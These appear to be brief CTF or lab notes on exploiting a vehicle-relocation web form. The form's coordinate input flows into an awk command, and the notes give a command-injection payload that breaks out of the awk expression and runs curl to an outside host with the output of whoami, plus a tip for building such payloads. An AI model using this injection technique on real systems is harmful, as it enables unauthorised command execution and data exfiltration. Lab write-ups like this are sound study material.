- Get command execution
- If feasable, get reverse shell

![[Pasted image 20250406162547.png]]

# Information
---
- Enter `registration` number and new `coordinates` to move that vehicle to new location
	- ![[Pasted image 20250406162756.png]]
- Shows executed command:
	 ![[Pasted image 20250406162817.png]]


Exploitation
---
- Looks like a formula using `awk` utility:
	- `awk 'BEGIN {print sqrt( ((400-500)^2) + (( 105 - 500 )^2) )}'`
- Our input is `500, 500` in this case
- **Payload:**
- ``
	```bash
	500 )^2) )}';curl http://172.19.0.1:9001/$(whoami);#
	```
![[Pasted image 20250406165955.png]]
```

- ==**Note: While making payloads, just copy the whole remaining thing that comes after the input to start the payload with, here `500 )^2) )}'`==**

# Shell
---
![[Pasted image 20250406170224.png]]